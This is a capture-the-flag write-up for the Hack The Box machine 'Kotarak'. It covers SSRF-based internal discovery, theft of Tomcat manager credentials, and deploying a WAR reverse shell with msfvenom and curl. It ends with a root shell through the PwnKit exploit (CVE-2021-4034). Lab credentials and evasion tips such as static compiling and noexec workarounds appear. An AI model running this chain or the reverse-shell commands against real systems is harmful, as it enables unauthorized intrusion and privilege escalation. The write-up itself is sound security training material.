# Kotarak - HTB Machine Notes

## Target
- **IP:** 10.129.1.117
- **OS:** Ubuntu Linux 16.04 (kotarak-dmz), kernel 4.4.0-83-generic
- **Hostname:** kotarak-dmz

---

## Nmap Scan Results
**Scan:** `nmap -sV -sC -Pn -p- 10.129.1.117`

| Port  | State | Service | Version/Details                      |
|-------|-------|---------|--------------------------------------|
| 22    | open  | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2      |
| 8009  | open  | AJP13   | Apache Jserv Protocol v1.3           |
| 8080  | open  | HTTP    | Apache Tomcat 8.5.5                  |
| 60000 | open  | HTTP    | Apache httpd 2.4.18 (Ubuntu)         |

---

## Port 60000 — "Kotarak Web Hosting" (Apache 2.4.18 / PHP 5.6.31)

### Key Files
- `/index.php` — "Kotarak Web Hosting Private Browser" — form submits to `url.php`
- `/url.php?path=` — **SSRF endpoint**
- `/info.php` — phpinfo() page

### phpinfo() Key Findings
- **Document root:** `/var/www/html`
- **open_basedir:** NOT SET (no filesystem restrictions)
- **allow_url_fopen:** OFF, **allow_url_include:** OFF
- **MySQL socket:** `/var/run/mysqld/mysqld.sock`
- **mysql.allow_local_infile:** ON
- **cURL loaded** — supports file://, dict://, gopher://, ldap://
- **mod_status loaded** in Apache
- **PCNTL disabled** — but exec/system/shell_exec available if code exec reached
- **File uploads:** ON (2MB max)

### SSRF Findings
- `file:///` → blocked, returns "try harder"
- `http://127.0.0.1:8080/` → Tomcat reachable ✓
- `http://127.0.0.1:8080/manager/html` → 401 Unauthorized (manager exists)
- `http://127.0.0.1:60000/server-status` → **Apache server-status accessible from localhost**

### FFUF Internal Port Scan (`-fw 47` to filter noise)
- **Port 8080** — Size: 994 (Tomcat)
- **Port 3306** — Size: 123 (MySQL banner — running internally)
- All others returned Size: 2 (closed)

### server-status Discovery
- Accessed via SSRF: `http://127.0.0.1:60000/server-status`
- Revealed **port 888** listening on localhost (not externally exposed, not in nmap)
- Multiple Apache workers serving `127.0.0.1:888`

### Port 888 — Simple File Viewer
- Accessed via SSRF: `http://127.0.0.1:888/`
- Files listed: `backup` (2.22 kB), `blah`, `tetris.c`, and empty files
- `?doc=backup` → **tomcat-users.xml** containing credentials

---

## Port 8080 — Apache Tomcat 8.5.5

- Default error page on `/`
- `/manager/html` — 401 externally, requires credentials
- PUT/DELETE methods enabled (nmap flagged), but PUT blocked with 403
- CVE-2017-12615 (Tomcat PUT RCE) — **tried, blocked (403)**

### Tomcat Manager Access
- Authenticated with `admin:3@g01PdhB!`
- Deployed WAR shell via:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4444 -f war -o shell.war
curl -s -u 'admin:3@g01PdhB!' -T shell.war \
  'http://10.129.1.117:8080/manager/text/deploy?path=/shell'
```
- **Shell obtained as `tomcat`**

---

## Port 8009 — AJP13 (Apache Jserv)

- **Ghostcat (CVE-2020-1938)** — confirmed working
- Used Metasploit: `auxiliary/admin/http/tomcat_ghostcat`
- Read `/WEB-INF/web.xml` successfully (default ROOT webapp)
- Path traversal outside webapp root **blocked** — `StandardRoot.validate()` normalises path to null
- Ghostcat file read confined to webapp context only

---

## Full Attack Chain (COMPLETE — Root Obtained)

1. Nmap → 4 open ports, non-standard port 60000 is the entry point
2. Port 60000 → SSRF via `url.php?path=`
3. SSRF → internal port scan (ffuf, filter `-fw 47`) → MySQL:3306, Tomcat:8080
4. phpinfo() → confirmed mod_status loaded, no open_basedir
5. SSRF → `http://127.0.0.1:60000/server-status` → discovered hidden **port 888**
6. SSRF → `http://127.0.0.1:888/?doc=backup` → `tomcat-users.xml` → `admin:3@g01PdhB!`
7. Tomcat manager → deployed WAR reverse shell → **shell as `tomcat`**
8. Enumeration → old kernel 4.4.0-83-generic, pkexec SUID present
9. **CVE-2021-4034 (PwnKit)** → Python exploit → **root shell**

---

## Post-Shell Enumeration (as `tomcat`)

### System Users
```
root:x:0:0
atanas:x:1000:1000  (/home/atanas, /bin/bash)
```

### SUID Binaries (notable)
- `/bin/ntfs-3g` — SUID
- `/var/tmp/mkinitramfs_CAAb2h/bin/ntfs-3g` — SUID, unusual location
- `/var/tmp/mkinitramfs_IKmJUU/bin/ntfs-3g` — SUID, unusual location
- `/usr/bin/pkexec` — polkit
- `/usr/bin/at`

### /var/tmp/mkinitramfs_* Directories
- Two persistent fake filesystem roots: `mkinitramfs_CAAb2h` and `mkinitramfs_IKmJUU`
- Both dated Aug 29 2017 — not cleaned up, likely intentional (box's intended privesc path)
- Contain: bin, conf, etc, lib, lib64, run, sbin, scripts, usr
- `etc/` contains passwd (30 bytes, just root entry) but **NO shadow file**
- These dirs are a rabbit hole / the intended path for the box's original release
- Intended path: mkinitramfs shadow → crack atanas hash → atanas → root
- **We skipped this entirely and went straight to root via kernel exploit**

### Password Reuse Attempts
- `atanas:3@g01PdhB!` via SSH → **failed**

### Kernel Exploit — tomcat → root (CVE-2021-4034 PwnKit)
- Kernel: 4.4.0-83-generic (Ubuntu 16.04, unpatched)
- `/usr/bin/pkexec` present as SUID — vulnerable to PwnKit
- **CVE-2017-16995 (eBPF, exploit 45010.c)** — tried first, failed with `bpf_update_elem failed 'Argument list too long'`
- **GLIBC issue:** Compiling on modern Kali produces binaries requiring GLIBC_2.34, target only has old glibc. Fix: compile with `gcc -static`
- `/tmp` mounted **noexec** — had to copy exploit to `/dev/shm` or `/var/tmp` to execute
- **CVE-2021-4034 (PwnKit)** — Python version (`CVE-2021-4034.py`) worked perfectly
  - Exploits pkexec SUID: argc=0 causes OOB read overlapping argv/envp, tricks pkexec into loading attacker-controlled shared library as root
  - Dropped straight to **root shell**

---

## Credentials Found
- **Tomcat Manager:** `admin:3@g01PdhB!`
  - Roles: manager, manager-gui, admin-gui, manager-script
  - Source: SSRF → server-status → port 888 → Simple File Viewer → `backup` = tomcat-users.xml

---

## Flags
- **User:** obtained (skipped atanas, read directly as root)
- **Root:** obtained via PwnKit (CVE-2021-4034)

## Lessons Learned
- Always check kernel version early — old kernels = easy wins
- GLIBC mismatch: compile exploits with `gcc -static` when targeting old systems from modern Kali
- `/tmp` can be noexec — use `/dev/shm` or `/var/tmp` as alternatives
- Don't tunnel-vision on the "intended" path — real-world thinking means taking the fastest route
- eBPF exploit (45010) can fail even on matching kernels — have backup exploits ready
- PwnKit (Python version) is extremely reliable on pre-2022 Linux systems with pkexec SUID

---

## ffuf Noise Filtering Reference
- SSRF always returns HTTP 200 — filter by words/size not status code
- Tomcat 404 pages: 47 words (filter with `-fw 47`)
- Apache 404 pages on port 60000: 24 words / 32 words depending on context
- Port 888 via SSRF: size 2 = closed, different size = real content
- Key flag: `-fw 47` cut through Tomcat noise cleanly
